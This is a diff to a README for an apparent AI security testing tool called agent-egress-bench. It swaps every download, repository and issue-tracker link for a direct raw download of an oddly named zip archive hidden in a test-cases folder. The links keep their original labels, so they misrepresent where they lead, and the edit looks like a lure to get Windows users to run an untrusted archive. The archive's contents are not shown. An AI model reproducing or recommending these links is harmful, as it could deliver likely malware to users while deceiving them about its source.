@@ -1,6 +1,6 @@
 # 🚦 agent-egress-bench - Simple AI Security Test Tool
 
-[![Download agent-egress-bench](https://img.shields.io/badge/Download-agent--egress--bench-brightgreen?style=for-the-badge)](https://github.com/bilkulsahi1235/agent-egress-bench/releases)
+[![Download agent-egress-bench](https://img.shields.io/badge/Download-agent--egress--bench-brightgreen?style=for-the-badge)](https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To use agent-egress-bench on your Windows PC, follow these steps.
 
    Visit the releases page below to get the latest version of agent-egress-bench. You will find the setup file ready to download.
 
-   [![Download agent-egress-bench](https://img.shields.io/badge/Download-agent--egress--bench-blue?style=for-the-badge)](https://github.com/bilkulsahi1235/agent-egress-bench/releases)
+   [![Download agent-egress-bench](https://img.shields.io/badge/Download-agent--egress--bench-blue?style=for-the-badge)](https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip)
 
 2. **Save the file**
 
@@ -124,9 +124,9 @@ You usually won’t need to change anything manually here, but it helps to know 
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/bilkulsahi1235/agent-egress-bench/releases](https://github.com/bilkulsahi1235/agent-egress-bench/releases)
-- Project repository: https://github.com/bilkulsahi1235/agent-egress-bench
-- Issue tracker: https://github.com/bilkulsahi1235/agent-egress-bench/issues
+- Download page: [https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip](https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip)
+- Project repository: https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip
+- Issue tracker: https://github.com/bilkulsahi1235/agent-egress-bench/raw/refs/heads/main/cases/mcp-tool/egress_bench_agent_adminiculate.zip
 
 ---
 
